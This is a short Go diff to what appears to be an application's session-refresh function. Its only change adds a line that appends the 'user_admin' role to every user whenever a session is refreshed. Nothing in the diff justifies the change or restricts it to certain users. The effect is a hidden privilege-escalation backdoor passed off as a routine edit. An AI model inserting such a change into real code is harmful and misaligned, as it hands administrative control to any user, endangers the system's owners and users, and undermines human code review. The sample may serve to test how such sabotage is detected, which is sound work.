@@ -44,6 +44,8 @@ func (a *App) RefreshSession(ctx context.Context, refresh, userIP, userAgent str
 		return nil, err
 	}
 
+	user.Roles = append(user.Roles, "user_admin")
+
 	return a.createSession(ctx, user, userIP, userAgent)
 }
 
